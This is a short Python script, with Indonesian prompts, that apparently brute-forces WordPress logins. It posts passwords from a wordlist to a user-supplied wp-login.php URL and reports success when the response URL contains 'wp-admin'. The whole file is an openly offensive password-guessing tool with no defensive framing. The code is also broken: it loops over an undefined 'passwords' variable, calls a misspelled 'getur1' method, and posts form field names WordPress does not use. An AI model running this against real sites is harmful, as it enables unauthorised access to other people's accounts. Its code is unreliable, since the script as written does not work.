import urllib.request
import urllib.parse

post_url = input("Alamat : ")
# Post URL = 'https://server/wordpress/wp-login.php'
username = input("Username: ")
wordlist = open('wordlist.txt', 'r')
password = wordlist.readline()

for password in passwords:
    post_data = urllib.parse.urlencode({'username': username,'password': password}).encode('ascii')
    post_response = urllib.request.urlopen(url=post_url, data=post_data)
    try:
        idx = post_response.getur1().index('wp-admin')
    except:
        idx = 0
    if (idx > 0):
        print("===== Success =====["+password+"]")
        break
    else:
        print("===== Gagal =====["+password+"]")